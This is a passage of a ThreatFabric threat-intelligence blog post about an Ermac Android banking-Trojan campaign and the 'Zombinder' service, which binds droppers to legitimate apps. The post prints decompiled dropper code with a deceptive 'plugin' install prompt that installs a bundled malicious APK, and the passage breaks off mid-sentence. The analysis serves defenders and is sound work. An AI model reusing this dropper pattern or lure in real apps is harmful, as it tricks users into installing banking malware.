---
title: Zombinder: new obfuscation service used by Ermac, now distributed next to desktop stealers
url: https://www.threatfabric.com/blogs/zombinder-ermac-and-desktop-stealers.html
source: ThreatFabric
date: 2022-12-09
fetch_date: 2025-10-04T01:03:24.628967
---

# Zombinder: new obfuscation service used by Ermac, now distributed next to desktop stealers

[Skip to content](#main-content)

[![threatfabric-logo-light](https://www.threatfabric.com/hubfs/Threatfabric/logos/threatfabric-logo-light.svg "threatfabric-logo-light")](//www.threatfabric.com/)

[![threatfabric-logo-light](https://www.threatfabric.com/hubfs/Threatfabric/logos/threatfabric-logo-light.svg "threatfabric-logo-light")](//www.threatfabric.com/)

* OUR SOLUTIONS
  + [Mobile Threat Intelligence (MTI)](https://www.threatfabric.com/mti)
  + [Fraud Risk Suite (FRS)](https://www.threatfabric.com/frs)
* [PARTNERS](https://www.threatfabric.com/partners)
* [WEBINARS](https://www.threatfabric.com/webinars)
* [ARTICLES](https://www.threatfabric.com/blogs)
* RESOURCES
  + [DATASHEETS & REPORTS](https://www.threatfabric.com/resources)
  + [IN THE NEWS](https://www.threatfabric.com/news)
* [Contact](https://www.threatfabric.com/contact)
* [Linkedin](https://www.linkedin.com/company/threatfabric)
* [Twitter](https://twitter.com/threatfabric)
* [Jobs](https://www.threatfabric.com/jobs)
* [Privacy](https://www.threatfabric.com/privacy)
* [Intel/PGP](https://www.threatfabric.com/contact)

[Contact](https://www.threatfabric.com/contact)

Research

## Zombinder: new obfuscation service used by Ermac, now distributed next to desktop stealers

08 December 2022

![](https://www.threatfabric.com/hubfs/Threatfabric/images/cover.jpg)

### Jump to

## Targeting different platforms and introducing Zombinder

The history of the threat landscape has seen several cases of threat actors using Trojans targeting different platforms and systems. This time while analyzing the activity of the Android banking Trojan Ermac, ThreatFabric’s analysts discovered a campaign employing several Trojans, and targeting both Android and Windows users at the same time, in order to reach as much victims as possible. Besides Ermac Android banking Trojan, the campaign involved desktop malware in the form of Erbium, Aurora stealer, and Laplas “clipper”.

This campaign resulted in **thousands** of victims, having for example Erbium stealer successfully exfiltrate data from more then **1300 victims**.

In this blog we also highlight a third-party service on darknet used to bind malicious payloads to legitimate Android applications, that we dubbed **Zombinder**. It is used to bind a malicious payload to a legitimate application, in order to trick victims to install it.

## Everyone needs Wi-Fi

While investigating Ermac’s activity, our researchers spotted an interesting campaign masquerading as applications for Wi-Fi authorization. It was distributed through a fake one-page website containing only two buttons.

![website](https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/website.png?width=1920&height=1080&name=website.png)

As you might have already guessed, the “Download for Android” button leads to downloading samples of Ermac. We classify this variant as Ermac.C, having the following capabilities amongst others that were previously widely reported:

* Overlay attack to steal PII
* Keylogging
* Stealing e-mails from Gmail application
* Stealing 2FA codes
* Stealing seed phrases from several cryptocurrency wallets

It is worth mentioning that original actor DukeEugene announced a new version of Ermac (“Ermac 3”) coming soon that will contain new features, but it is still in development at the time of writing this blog.

During the monitoring of abovementioned campaign, we observed several approaches and lures used by the actor. It started with Wi-Fi authorization app which in fact was Ermac with obfuscation of the malicious code. Shortly after our monitoring systems spotted **several updates** of the payload: in this stage it was masquerading as browser update. However, another detail drew our attention: some of the downloaded apps were not directly Ermac, but a “legitimate” app that, during its normal operation, installed Ermac as payload targeting multiple banking applications that can be found in the [Appendix](https://www.threatfabric.com/blogs/zombinder-ermac-and-desktop-stealers.html#ermac-targets).

Such apps disguised as **modified version** of Instagram, WiFi Auto Authenticator, Football Live Streaming, etc. The package names were also the same as for legitimate applications.

In fact, the actor used a third-party service provided on darknet to “glue”, or bind, dropper capabilities to a legitimate application. After downloading the bound application, it will act as usual unless it shows a message stating that the app needs to be updated. At this point, if accepted by the victim, the seemingly legitimate application will install this update, which is nothing else than Ermac. The whole process from installing the application to Ermac running on the device can be seen on the following picture.

![dropper](https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/dropper.png?width=1920&height=1080&name=dropper.png)

Such process is achieved by “glueing” obfuscated malicious payload to a legitimate app with minor updates made to original source code to include installation and loading of the malicious payload. We called this dropper “Zombinder”, as it takes the original application and binds malicious code to it, making it a “zombie” that installs the desired payload. The following snippet provides an example of added code to install and launch the payload.

```
AlertDialog.Builder alertDialog$Builder0 = new AlertDialog.Builder(this);
alertDialog$Builder0.setMessage("This app requires the plugin app to be installed. Please, confirm the installation by the following steps: press Settings -> enable the toggle button -> press Install");
alertDialog$Builder0.setCancelable(false);
alertDialog$Builder0.setPositiveButton("OK", () - > {
    new Handler().postDelayed(new Runnable() {
        @Override
        public void run() {
            OverlayActivity.this.isInstalled = OverlayActivity.this.isAppInstalled(OverlayActivity.this.target);
        }
    }, 3000 L);
    if (!OverlayActivity.this.isInstalled) {
        try {
            File file0 = OverlayActivity.this.getApplicationContext().getExternalFilesDir(Environment.DIRECTORY_DOCUMENTS);
            File file1 = new File(file0, "app.apk");
            StringBuilder stringBuilder0 = new StringBuilder();
            String s = File.separator;
            OverlayActivity.this.copyAssetFile(stringBuilder0.append(file0.toString()).append(s).append("app.apk").toString());
            if (file1.exists()) {
                Intent intent0 = new Intent("android.intent.action.INSTALL_PACKAGE");
                intent0.setFlags(1);
                intent0.setDataAndType(FileProvider.getUriForFile(OverlayActivity.this, "com.og.appran.pan.fileprovider", file1), "application/vnd.android.package-archive");
                OverlayActivity.this.startActivity(Intent.createChooser(intent0, ""));
            }
        } catch (IOException unused_ex) {}
        OverlayActivity.this.startService(new Intent(OverlayActivity.this, LuckyService.class));
        return;
    }
    try {
        Intent intent1 = OverlayActivity.this.getPackageManager().getLaunchIntentForPackage("com.fuyocelasisi.woyopu");
        if (intent1 != null) {
            OverlayActivity.this.startActivity(intent1);
        }
    } catch (Exception unused_ex) {}
    OverlayActivity.this.finish();
});
```

The binding service is provided by an actor well-known in the threat landscape, and is an addition to major project: an obfuscation tool that is used by multiple actors on Android criminal scene. The binding service itself was announced in March 2022 and now seems to be used frequently by different actors.

![binding](https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/binding.png?width=1920&height=1080&name=binding.png)

We have observed several “zombie” applications used to distribute mobile malware (e.g. Ermac, Sova).

![zombinder](https://www.threatfabric.com/hs-fs/hubfs/Threatfabric/images/zombinder.png?width=1920&height=1080&name=zombinder.png)

The latest campai...